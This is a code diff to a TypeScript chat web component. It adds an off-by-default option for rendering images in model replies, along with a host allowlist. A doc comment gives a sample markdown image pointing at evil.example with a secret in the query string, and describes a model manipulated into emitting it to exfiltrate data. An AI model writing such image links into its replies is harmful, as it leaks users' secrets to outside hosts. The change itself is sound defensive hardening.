@@ -9,7 +9,7 @@ import type {
   Role,
   Attachment,
 } from './types.js';
-import { renderMarkdown, StreamingMarkdown } from './markdown/markdown.js';
+import { renderMarkdown, StreamingMarkdown, type ImagePolicy } from './markdown/markdown.js';
 import { chatStyles } from './styles.js';
 import { hljsTheme } from './markdown/hljs-theme.js';
 import { DEFAULT_LABELS, type ChatLabels } from './labels.js';
@@ -241,6 +241,31 @@ export class AiChat extends LitElement {
   @property({ type: Number, attribute: 'max-attachment-size' })
   maxAttachmentSize = 0;
 
+  /**
+   * Render images inside replies. Off by default: a reply is model output, and
+   * an image tag makes the reader's browser fetch its URL the moment it shows —
+   * a model talked into writing `![](https://evil.example/?d=<secret>)` would
+   * send the secret out (markdown image exfiltration). Off, an image renders as
+   * its alt text. Turn on only when replies need pictures, and pair it with
+   * `image-hosts`. Usage: `<ai-chat allow-images image-hosts="https://cdn.example.com/">`.
+   */
+  @property({ type: Boolean, attribute: 'allow-images' })
+  allowImages = false;
+
+  /**
+   * With `allow-images`, the URL prefixes images may load from — space-separated
+   * in the attribute, an array as a property. Only `https:` URLs ever load.
+   * Empty (default) allows any `https:` image.
+   */
+  @property({
+    attribute: 'image-hosts',
+    converter: {
+      fromAttribute: (value: string | null) => (value ?? '').split(/\s+/).filter(Boolean),
+      toAttribute: (value: readonly string[]) => value.join(' '),
+    },
+  })
+  imageHosts: readonly string[] = [];
+
   /** The conversation. Bindable and reflected back out via events. */
   @property({ attribute: false })
   messages: ChatMessage[] = [];
@@ -413,7 +438,7 @@ export class AiChat extends LitElement {
     if (m.streaming) {
       let r = this._streamRenderers.get(m.id);
       if (!r) {
-        r = new StreamingMarkdown(this._labels.copy);
+        r = new StreamingMarkdown(this._labels.copy, this._imagePolicy);
         this._streamRenderers.set(m.id, r);
       }
       const { blocks, tail } = r.renderParts(m.content);
@@ -429,7 +454,11 @@ export class AiChat extends LitElement {
     // Settled: render fully once and let the incremental state go. The map
     // stays tiny — it only ever holds messages that are streaming right now.
     this._streamRenderers.delete(m.id);
-    return html`<div class="markdown">${unsafeHTML(renderMarkdown(m.content, this._labels.copy))}</div>`;
+    return html`<div class="markdown">${unsafeHTML(renderMarkdown(m.content, this._labels.copy, this._imagePolicy))}</div>`;
+  }
+
+  private get _imagePolicy(): ImagePolicy {
+    return { allowImages: this.allowImages, imageHosts: this.imageHosts };
   }
 
   /** Programmatically append a message without sending it. */
